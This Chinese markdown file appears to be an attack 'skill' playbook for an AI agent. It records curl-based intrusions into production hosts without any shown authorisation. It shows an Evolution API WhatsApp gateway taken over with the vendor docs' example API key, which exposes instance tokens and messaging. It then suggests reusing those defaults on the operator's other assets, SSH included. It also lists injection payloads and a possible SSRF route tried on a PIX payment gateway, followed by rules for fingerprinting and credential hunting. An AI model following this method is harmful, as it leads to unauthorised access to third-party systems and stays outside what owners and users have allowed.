# 实测报文:文档示例凭据 → 生产网关全局管理员

> 全部为本技能建立时的实测记录(2026-09)。凭据一律用「文档示例值」表述;`<host>` 代指目标。
> ⚠️ 结论要如实:**案例 A 成功拿到管理员;案例 B 的文档只有占位符,未拿到凭据。** 不要把 B 写成成功。

---

## 案例 A:Evolution API 2.3.7(WhatsApp 网关)——✅ 成功

### 1. 自报家门(零成本指纹)

```bash
curl -s https://<host>/
```
```json
{"status":200,"message":"Welcome to the Evolution API, it is working!","version":"2.3.7", ...}
```

`GET /` 直接吐出产品名 + 版本。**这一步就把技术栈、版本、后续该打哪套文档全确定了。**

未匹配路由的形态(用于区分「路由不存在」):
```json
{"status":"error","message":"Route not found."}
```

`/manager` → 200,返回管理 SPA。

### 2. 鉴权面

| 请求 | 响应 | 含义 |
|---|---|---|
| `GET /instance/fetchInstances`(无 apikey) | **401** | 路由存在、鉴权生效 |
| `GET /api/v1/instance/fetchInstances` | 404 `Cannot GET …` | **路由挂在根路径,不在 `/api/v1` 下**——前缀猜错会误判为「没有这个功能」 |

鉴权方式 = **单一 `apikey` 请求头**,全局值来自 `.env` 的 `AUTHENTICATION_API_KEY`。

### 3. 命中:文档示例值原样可用

把该产品**官方文档里的示例 `AUTHENTICATION_API_KEY` 值**原样填入:

```bash
curl -s https://<host>/instance/fetchInstances -H 'apikey: <文档示例值>'
```

→ **200**,返回实例数组,含 `id` / `name` / `connectionStatus` / `ownerJid` / **`token`**。

拿到的实例:名称形如 `masterdev`,`connectionStatus: connecting`,`ownerJid: null`。

官方文档原文(旁注警告,运营方没读):

> `AUTHENTICATION_API_KEY=<示例值>`
> … Generate a strong, random API key for production … **Never use the example key above.**

### 4. 全局限权能做什么(2.x)

- 列 / 建 / 删实例
- 读每个实例的 `token`
- 改实例 webhook、proxy、integration 配置
- 看连接状态、代表实例发消息
- `/manager` 管理 SPA 全功能

### 5. ⚠️ 价值上限(必须如实定性)

`connectionStatus: connecting` + `ownerJid: null` = **从未配对成功** → **消息历史为空**,读不到任何对话。

此时正确表述:

> 未授权访问 PoV + 运营方运维卫生画像 —— **不是**「已进入数据层」。

**但它是最强的横向情报源**:证明该运营方会用文档默认值 → 立刻把同一类默认值/同源字符串拿去横向试它其它资产(面板登录、Webmail、上游网关、SSH 目标性弱口令)。

---

## 案例 B:某 PIX 支付网关文档 ——❌ 未拿到凭据(记录边界,避免重复投入)

### 1. 文档端点公开可读

```bash
curl -s https://<host>/api/docs      # → 200, 4084 bytes,H TML 文档页
```

文档列出的接口:

```
POST /api/auth/login    { client_id, client_secret } → Bearer token
POST /api/deposits      { amount, external_id, clientCallbackUrl, payer{name,email,document} } → PIX 二维码
POST /api/withdrawals   { amount, pix_key, key_type, name, taxId, description, clientCallbackUrl } → 向 PIX 键打钱
```

**文档 head 写的 base 是上游厂商域**(`https://node.<厂商域>`),而**同一套 API 实际也挂在我们正打的这台机器上** → §「base URL ≠ 部署主机」的实证。

### 2. 鉴权判读

| 请求 | 响应 | 含义 |
|---|---|---|
| `POST /api/auth/login` 任意凭据 | **401** `{"message":"Invalid client_id or client_secret."}` | 路由存在、凭据被真校验;文案直接给出参数名 |
| `GET /api/auth/login` | **405** | 路由存在,只收 POST |
| `POST /api/deposits` | **404** `{"status":"error","message":"Route not found."}` | **该 host 未挂这条路由**(文档是上游的) |
| `GET /api/health` `/api/status` `/api/clients` `/api/deposit` `/api/withdrawals` `/api/balance` `/api/webhook` `/api/config` … | 全部 404,响应**恒为 47 字节** | 统一「路由不存在」;长度恒定 = 可靠的 404 基线 |

### 3. 栈指纹:严格 JSON schema + 参数化查询 → 立刻停手

| 入参 | 响应 |
|---|---|
| 对象/数组塞进字符串字段(`{"client_id":{"$ne":null}…}`) | **400/500** schema 校验拒绝(`Invalid value`)→ 典型 **Fastify(+Prisma)** |
| `client_id: "' OR 1=1-- "` | **401**(普通鉴权失败,无注入特征) |

**结论:这条面不是注入面。** 发现类型校验就应立刻停止注入投入,把预算全押到「找凭据」(前端 JS / 租户 `.env` / 厂商站)上。

### 4. 文档里的示例值只是占位符

文档通篇是 `your_client_id` / `YOUR_ACCESS_TOKEN` / `unique_withdrawal_id` —— **没有一个真实字面量**,所以本技能在 B 上不适用(这正是要如实标注「未成功」的原因)。

### 5. 💡 没拿到凭据也有收获:SSRF 面识别

`clientCallbackUrl` **由调用方指定** = 服务端会主动向该 URL 发起请求。这类参数是**打进同机 `127.0.0.1` 内部服务的天然通道**(内部服务常只信本机来源)。拿到凭据后优先看它——**但没凭据时它不可用,别当已通的道路去汇报。**

---

## 响应形态速查(判读用)

| 形态 | 判定 |
|---|---|
| `401` + 业务文案 | 路由存在,鉴权生效 → 找凭据 |
| `404` + 47B 级 JSON `Route not found.` | 路由不存在(Node/Fastify 风格) |
| `404` + HTML / SPA catch-all | 前端站,不是 API host |
| `405` | 路由存在,method 不匹配 |
| `200` 且长度 == 该 host catch-all 基线 | 兜底页,不是命中 |
| `400/500 Invalid value` | schema 严格校验(Fastify+Prisma 系)→ 别投注入 |

**基线法**:批量扫路径前先请求一个保证不存在的路径,记下字节数。**只有长度 ≠ 基线的响应才是候选。**

如 `{"status":"error","message":"Route not found."}` 与 `{"message":"Invalid client_id or client_secret."}` 的对比——**前者是「没有」,后者是「有但不给你」**,这两者必须分开记录,否则报告会自相矛盾。

---

## 通用规则(本技能的核心)

1. **先读厂商文档,再动字典。** 文档端点常明文公开。
2. **文档里的字面量全部当默认口令候选**,原样填。
3. **401 文案要逐字读**,它给出参数名与错误语义。
4. **类型校验出现 = 注入无望**,立刻转向找凭据。
5. **base URL 可能不是你在打的 host**,单条 404 不能否定整条线。
6. **拿到权限先确认数据上限**,再把结论定性为「PoV / 卫生画像」或「数据层」——不要含糊。
